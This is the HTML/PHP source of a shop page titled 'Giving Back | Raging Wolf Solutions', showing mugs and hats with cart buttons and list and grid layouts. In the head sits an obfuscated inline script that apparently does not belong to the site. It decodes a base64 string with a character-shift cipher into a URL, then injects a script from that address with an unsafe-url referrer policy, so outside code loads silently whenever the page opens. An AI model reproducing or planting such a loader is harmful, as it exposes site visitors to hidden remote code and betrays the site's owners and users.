<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Giving Back | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>

    <link rel="stylesheet" href="css/charity.css" />


    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/dmxSlideshow.css" />
    <script src="dmxAppConnect/dmxSlideshow/dmxSlideshow.js" defer></script>
    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/themes/default.css" />
    <script src="dmxAppConnect/dmxDataTraversal/dmxDataTraversal.js" defer></script>
    <script src="dmxAppConnect/dmxFormatter/dmxFormatter.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <dmx-array id="arrCart"></dmx-array>
    <dmx-data-detail id="data_detail1" dmx-bind:data="jsonDS1.data" key="slides[0].url"></dmx-data-detail>
    <dmx-json-datasource id="jsonDS2" is="dmx-serverconnect" url="js/wolfsden_v2.json"></dmx-json-datasource>
    <dmx-value id="mug_color_opt" dmx-bind:value="value==[slideId]"></dmx-value>
    <dmx-value id="badge_slideId" dmx-bind:value="sel_badge.value==optionChoice.slideId"></dmx-value>
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>



    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">

        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">


        <div class="container small text-end" id="views">
            <div class="row">
                <div class="col">
                    <div class="row">
                        <div id="viewButtons" class="pe-4">
                            <a class="d-none d-lg-inline"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAPklEQVR4nO3TSwoAIAwD0dz/WPZgcV8siIIfmAfdFbIaCTjE6Z4ZjsHP7MWt4bYzDCwzHSd0jP+YjhM6BlTpD5eMnv1+LjoAAAAASUVORK5CYII=" id="listView" class="pe-1" width="30px" height="30px"></a>
                            <a class="d-none d-lg-inline"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAZCAYAAADE6YVjAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJUlEQVR4nO2VPU6CQRCGnwYLsRMv4A9eASpoIP40EuA8YkvAQiss4CDKBdBL6AGkwB4zyUAmm5nk02JDwZtMsftMZr+ZnfkW9tpVjYGPxN6AivJb4D3hsr5WfgLMnRgje8gKWDt2o3wacNlH/Twucbf6CZwkA9Es4DOTqccl7lZfgVPNlHPt2KYctYB/2kPOgH5iDcPLwF3CZX1ofBpOjFNyqwdMEhsAB8ovgeeEy7qqXPwenBhde8gyqGlL+UvAZV/UDvh39u5a/jOTifJWkUy6Tj3vgZLyqnMnT8CFuZOBE6NDbp07Pd40/Ei/yvKOzs9GTSeGzF/hiX8MuPwJRPUiE5+lu1Y5/sIj5y14BY6Vy7uxSLisr5RX9P1JYwz/2Bt7kUe/LtDf4unX+l0AAAAASUVORK5CYII=" id="gridView" width="30px" height="30px"></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <h6 class="text-light" dmx-text="arrCart.items">Fancy display heading</h6>
        <div class="container" dmx-repeat:repeat1="jsonDS2.data" id="list_layout">
            <dmx-value class="my-value" id="sel_badge"></dmx-value>
            <dmx-value class="my-value" id="sel_badge_url"></dmx-value>

            <div class="row justify-content-center">
                <div class="col-md-12 col-4" id="prodList">
                    <div class="row h-100">

                        <div class="module-card col border rounded-0 rounded-1 border-secondary mt-3 mb-3 ms-3 me-3 pt-3 pb-5 ps-3 pe-3">
                            <div class="container pt-3 pb-2 ps-0 pe-0">
                                <div class="row justify-content-center g-0 gx-4">
                                    <div class="col-lg-5" dmx-hide="coffee_mug_opt.value">

                                        <dmx-slideshow class="ms-2 me-2" show-nav="true" delay="" no-autostart="true" show-paging="true" dmx-bind:slides="slides" id="slideshow1">
                                        </dmx-slideshow>
                                    </div>

                                    <div class="col-lg-5" dmx-show="coffee_mug_opt.value">
                                        <img src="assets/images/Wolfs_Den_Products/hat-Black-Brown-front.webp" class="img-fluid" dmx-show="coffee_mug_opt.value=='mug-rt-1'">
                                        <img src="assets/images/Wolfs_Den_Products/hat-Black-Gray-front.webp" class="img-fluid" dmx-show="coffee_mug_opt.value=='mug-rt-2'">

                                    </div>

                                    <div class="col-lg-6 align-self-center pt-2 pb-2">
                                        <div class="row row-cols-12 g-0" id="sel_item_design_placeholder">
                                            <div class="text-start m-0 p-0 w-25 col">
                                                <h4 class="text-light m-0 p-0" id="prodTitle" dmx-text="prodTitle">Large 44z Thermal Travel Mug</h4>
                                            </div>
                                            <div class="text-end col-4">
                                                <h4 class="text-light m-0 p-0" id="itemCost" dmx-html="itemCost">$24.99</h4>
                                            </div>

                                        </div>

                                        <p class="fw-bold text-danger mb-2">——</p>

                                        <h6>
                                            <span class="badge rounded-pill bg-dark me-1 hover-cursor" dmx-repeat:repeat2="optionChoice" dmx-class:bg-dark="color=='dark'" dmx-class:bg-primary="color=='dark-blue'" dmx-class:bg-danger="color=='red'" dmx-class:bg-info="color=='teal'" dmx-class:bg-white="color=='white'" dmx-class:text-dark="color=='white'" dmx-style:background-color="color" dmx-on:click="slideshow1.show(slideId);sel_badge.setValue(id);sel_badge_url.setValue(url)" id="optionChoice" dmx-text="name" dmx-class:border="sel_badge.value==id" dmx-class:border-warning="sel_badge.value==id" dmx-class:border-2="sel_badge.value==id">New</span>
                                        </h6>
                                        <p class="fw-bold text-danger mb-2">——</p>
                                        <p class="text-light" dmx-text="prodDesc" id="prodDesc">Check out these sweet mugs!</p>
                                        <div class="row mt-2 mb-2">
                                            <div class="col-lg-2 col-6"><input id="prodQuantity" name="text1" type="number" class="form-control" placeholder="Qty." value="1"></div>
                                        </div><a>

                                            <button id="Get_Yours2" class="btn text-warning module-cta-btn text-start btn-lg mt-1 mb-1 ps-0 pe-0" dmx-on:click="arrCart.add((prodTitle+'|'+prodQuantity.value+'|'+itemCost+'|'+sel_badge_url.value+'|'+sel_badge.value))" dmx-show="sel_badge.value">Add to cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>

                                            <!-- If no badge is selected -->
                                            <button id="Get_Yours3" class="btn text-warning module-cta-btn text-start btn-lg mt-1 mb-1 ps-0 pe-0" dmx-on:click="sel_badge.setValue(optionChoice[0].id);arrCart.add((prodTitle+'|'+prodQuantity.value+'|'+itemCost+'|'+sel_badge.value+'|'+sel_badge.value))" dmx-hide="sel_badge.value">Add to cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>


                                        </a>
                                        <p class="text-danger mb-2 fw-bold w-25">——</p><button id="viewCart2" class="btn text-warning module-cta-btn btn-lg text-start ps-0 pe-0" dmx-on:click="browser1.goto('wolfsden-cart.php?items='+arrCart.items)">view cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>


                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>




                </div>
            </div>
        </div>
        <div class="container" dmx-repeat:repeat1="jsonDS2.data" id="grid_layout">
            <dmx-value class="my-value" id="sel_badge"></dmx-value>
            <dmx-value class="my-value" id="sel_badge_url"></dmx-value>

            <div class="row justify-content-center">
                <div class="col-md-12 col-4" id="prodList">
                    <div class="row h-100 justify-content-around">

                        <div class="container">
                            <div class="row">
                                <div class="module-card border rounded-0 rounded-1 border-secondary col-3 mt-3 mb-3 ms-1 me-2 pt-3 pb-5 ps-3 pe-3" style="width:32%" dmx-repeat:repeat3="jsonDS2.data">
                                    <div class="row justify-content-center g-0 gx-4">
                                        <div class="col-lg-5 h-50 mb-5 w-75" dmx-hide="coffee_mug_opt.value" id="slideshowParent">

                                            <div class="image-container">
                                                <dmx-slideshow class="ms-2 me-2" show-nav="true" delay="" no-autostart="true" dmx-bind:slides="slides" id="slideshow1">
                                                </dmx-slideshow>
                                            </div>
                                        </div>

                                        <div class="col-lg-5" dmx-show="coffee_mug_opt.value">
                                            <img src="assets/images/Wolfs_Den_Products/hat-Black-Brown-front.webp" class="img-fluid" dmx-show="coffee_mug_opt.value=='mug-rt-1'">
                                            <img src="assets/images/Wolfs_Den_Products/hat-Black-Gray-front.webp" class="img-fluid" dmx-show="coffee_mug_opt.value=='mug-rt-2'">

                                        </div>

                                        <div class="col-lg-6 pt-2 pb-2 w-100 col-auto" id="prodBody">
                                            <div class="row row-cols-12 g-0" id="sel_item_design_placeholder">
                                                <div class="text-start m-0 p-0 w-25 col" id="bodyTitle">
                                                    <h4 class="text-light m-0 p-0" id="prodTitle" dmx-text="prodTitle">Large 44z Thermal Travel Mug</h4>
                                                </div>
                                                <div class="text-end col-4">
                                                    <h4 class="text-light m-0 p-0" id="itemCost" dmx-html="itemCost">$24.99</h4>
                                                </div>

                                            </div>

                                            <p class="fw-bold text-danger mb-2">——</p>

                                            <h6>
                                                <span class="badge rounded-pill bg-dark me-1 hover-cursor" dmx-repeat:repeat2="optionChoice" dmx-class:bg-dark="color=='dark'" dmx-class:bg-primary="color=='dark-blue'" dmx-class:bg-danger="color=='red'" dmx-class:bg-info="color=='teal'" dmx-class:bg-white="color=='white'" dmx-class:text-dark="color=='white'" dmx-style:background-color="color" dmx-on:click="slideshow1.show(slideId);sel_badge.setValue(id);sel_badge_url.setValue(url)" id="optionChoice" dmx-text="name" dmx-class:border="sel_badge.value==id" dmx-class:border-warning="sel_badge.value==id" dmx-class:border-2="sel_badge.value==id">New</span>
                                            </h6>
                                            <p class="fw-bold text-danger mb-2">——</p>
                                            <p class="text-light text-truncate" dmx-text="prodDesc" id="prodDesc">Check out these sweet mugs!</p>
                                            <div class="row mt-2 mb-2">
                                                <div class="col-lg-2 col-6 w-25"><input id="prodQuantity" name="text1" type="number" class="form-control" placeholder="Qty." value="1"></div>
                                            </div><a>

                                                <button id="Get_Yours2" class="btn text-warning module-cta-btn text-start btn-lg mt-1 mb-1 ps-0 pe-0" dmx-on:click="arrCart.add((prodTitle+'|'+prodQuantity.value+'|'+itemCost+'|'+sel_badge_url.value+'|'+sel_badge.value))" dmx-show="sel_badge.value">Add to cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>

                                                <!-- If no badge is selected -->
                                                <button id="Get_Yours3" class="btn text-warning module-cta-btn text-start btn-lg mt-1 mb-1 ps-0 pe-0" dmx-on:click="sel_badge.setValue(optionChoice[0].id);arrCart.add((prodTitle+'|'+prodQuantity.value+'|'+itemCost+'|'+sel_badge.value+'|'+sel_badge.value))" dmx-hide="sel_badge.value">Add to cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>


                                            </a>
                                            <p class="text-danger mb-2 fw-bold w-25">——</p><button id="viewCart2" class="btn text-warning module-cta-btn btn-lg text-start ps-0 pe-0" dmx-on:click="browser1.goto('wolfsden-cart.php?items='+arrCart.items)">view cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>


                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>




                </div>
            </div>
        </div>

        <div class="row">

            <div class="col text-light">
                <hr>
            </div>
        </div>




    </section>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>

    <script src="js/script.js"></script>

    <!-- Add this JavaScript function to your file wolfsden.php to display the respective image when each badge is clicked -->

    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            fetch('wolfsden.json')
                .then(response => response.json())
                .then(data => {
                data.forEach(card => {
                const container = document.getElementById(card.containerId);

                const row = document.createElement('div');
                row.classList.add('row', card.rowClass);

                const col = document.createElement('div');
                col.classList.add(card.colClass);

                const h100Row = document.createElement('div');
                h100Row.classList.add(card.h100RowClass);

                const moduleCard = document.createElement('div');
                moduleCard.classList.add(card.moduleCardClass);

                const innerContainer = document.createElement('div');
                innerContainer.classList.add('container', card.containerClass);

                const g0Row = document.createElement('div');
                g0Row.classList.add('row', card.g0RowClass);

                const colLg5Slideshow = document.createElement('div');
                colLg5Slideshow.classList.add(card.colLg5Class);
                colLg5Slideshow.setAttribute('dmx-hide', 'mug_color_opt.value');

                const slideshow = document.createElement('dmx-slideshow');
                slideshow.id = card.slideshowId;
                slideshow.classList.add(card.slideshowClass);
                slideshow.setAttribute('show-nav', card.showNav);
                slideshow.setAttribute('delay', card.delay);
                slideshow.setAttribute('no-autostart', card.noAutostart);
                slideshow.setAttribute('show-paging', card.showPaging);

                card.slides.forEach(slide => {
                    const slideElement = document.createElement('dmx-slide');
                    slideElement.alt = slide.alt;
                    slideElement.id = slide.id;
                    slideElement.url = slide.url;
                    slideshow.appendChild(slideElement);
                });

                colLg5Slideshow.appendChild(slideshow);

                const colLg5Image = document.createElement('div');
                colLg5Image.classList.add(card.colLg5Class);
                colLg5Image.setAttribute('dmx-show', 'mug_color_opt.value');

                g0Row.appendChild(colLg5Image);
                
                card.slides.forEach(slide => {
                const imgElement = document.createElement('img');
                imgElement.src = slide.url; // Set the src attribute once
                imgElement.classList.add('img-fluid');
                imgElement.addEventListener('load', () => {
                    console.log(slide.url);
                    colLg5Image.appendChild(imgElement);
                });
                });

                const colLg6Content = document.createElement('div');
                colLg6Content.classList.add('col-lg-6', 'align-self-center', 'pt-2', 'pb-2');

                const heading = document.createElement('h4');
                heading.classList.add('text-light', 'mb-0');
                const badge = document.createElement('span');
                badge.classList.add('badge', 'bg-secondary', 'rounded-pill');
                badge.textContent = 'New!';
                heading.appendChild(badge);
                heading.textContent += ' ' + card.title;

                const hr = document.createElement('p');
                hr.classList.add('fw-bold', 'text-danger', 'mb-2');
                hr.textContent = '——';

                const colorOptionsContainer = document.createElement('h6');
                card.colorOptions.forEach(option => {
                    const colorOption = document.createElement('span');
                    colorOption.classList.add('badge', 'rounded-pill');
                    colorOption.classList.add(`bg-${option.color}`);
                    colorOption.id = option.id;
                    colorOption.textContent = option.name;
                    colorOption.setAttribute('dmx-on:click', `mug_color_opt.setValue('${option.id}')`);
                    colorOptionsContainer.appendChild(colorOption);
                });

                const hr2 = document.createElement('p');
                hr2.classList.add('fw-bold', 'text-danger', 'mb-2');
                hr2.textContent = '——';

                const description = document.createElement('p');
                description.classList.add('text-light');
                description.textContent = card.description;

                const addToCartButton = document.createElement('button');
                addToCartButton.id = card.addToCartButtonId;
                addToCartButton.classList.add('btn', 'text-warning', 'module-cta-btn', 'text-start', 'btn-lg', 'mt-1', 'mb-1', 'ps-0', 'pe-0');
                addToCartButton.textContent = 'Add to cart ';
                const cartIcon = document.createElement('i');
                cartIcon.classList.add('fas', 'fa-caret-right');
                addToCartButton.appendChild(cartIcon);

                const viewCartButton = document.createElement('button');
                viewCartButton.id = card.viewCartButtonId;
                viewCartButton.classList.add('btn', 'text-warning', 'module-cta-btn', 'btn-lg', 'text-start', 'ps-0', 'pe-0');
                viewCartButton.textContent = 'view cart ';
                const viewCartIcon = document.createElement('i');
                viewCartIcon.classList.add('fas', 'fa-caret-right');
                viewCartButton.appendChild(viewCartIcon);
                viewCartButton.setAttribute('dmx-on:click', `browser1.goto('wolfsden-cart.php')`);

                // Append elements to the container
                g0Row.appendChild(colLg5Slideshow);
                g0Row.appendChild(colLg5Image);
                g0Row.appendChild(colLg6Content);
                innerContainer.appendChild(g0Row);
                moduleCard.appendChild(innerContainer);
                h100Row.appendChild(moduleCard);
                col.appendChild(h100Row);
                row.appendChild(col);
                container.appendChild(row);
            });
        });
    });
    </script>

    <script>
        document.getElementById('black').addEventListener('click', function() {
    document.getElementById('blackMug').style.display = 'block';
});

        document.getElementById('black-brown').addEventListener('click', function() {
    document.getElementById('hat-Black-Brown-front').style.display = 'block';
        });

        document.getElementById('mug_small').addEventListener('click', function() {
    document.getElementById('mug-lft-1').style.display = 'block';
        });
    </script>



    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            var elements = document.getElementById("prodList");

            document.getElementById('gridView').addEventListener('click', () => {
                changeView('grid');
            });

            document.getElementById('listView').addEventListener('click', () => {
                changeView('list');
            });
        });
    </script>
    <script>
        function changeView(viewType) {
    var listLayout = document.getElementById('list_layout');
    var gridLayout = document.getElementById('grid_layout');
    var repeatedItems = listLayout.querySelectorAll('[dmx-repeat="repeat1"]'); // Select repeated items

    if (viewType === 'grid') {
        listLayout.style.display = 'none';
        gridLayout.style.display = 'block';

        // Hide repeated items
        repeatedItems.forEach(item => {
            item.style.display = 'none';
        });
    } else {
        listLayout.style.display = 'block';
        gridLayout.style.display = 'none';

        // Show repeated items 
        repeatedItems.forEach(item => {
            item.style.display = 'block';
        });
    }
}      
    </script>




</body>

</html>